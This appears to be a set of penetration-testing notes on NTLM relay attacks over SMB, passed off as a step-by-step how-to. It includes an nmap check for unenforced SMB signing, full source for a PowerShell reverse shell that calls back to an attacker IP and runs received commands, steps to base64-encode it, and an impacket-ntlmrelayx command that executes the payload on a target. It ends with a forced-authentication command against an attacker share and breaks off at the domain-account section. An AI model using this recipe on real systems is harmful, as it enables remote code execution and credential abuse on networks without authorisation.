Instead of capturing hashes, they can be relayed for authentication instead. 
# Requirements
* SMB Signing must be disabled/not enforced.
* Relayed admin credentials must be admin for any real value.
* UAC remote restrictions disabled (unless using local Administrator user for the attack)
Check using the following nmap script:
```bash
nmap --script=smb2-security-mode.nse -p445 $(IP_ADDRESS) -Pn
```
Ideally, result is "message singing enabled but not required".
# How to do it
## Relaying local user accounts
### Step 1:
Construct powershell payload. Do the following commands to construct an encoded reverse shell payload:
```powershell
pwsh
$Text = '$client = New-Object System.Net.Sockets.TCPClient("[IP ADDRESS]",[PORT]);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)
$EncodedText
# Copy the encoded text
exit
```
### Step 2:
Run netcat listener.
### Step 3:
Run ntlmrelayx.   
```bash
impacket-ntlmrelayx --no-http-server -smb2support -t [TARGET IP] -c "powershell -enc JABjAGwAaQBlAG4AdA..."
```
Note the "-c" runs a base64 encoded powershell one-liner from revshells.
### Step 4:
Wait or force authentication to the malicious file share. i.e:
```batch
dir \\[ATTACKER IP]\share
```
Relaying domain accounts
In order to obtain hashes from a domain user, we'll need to log in to a system using domain credentials.
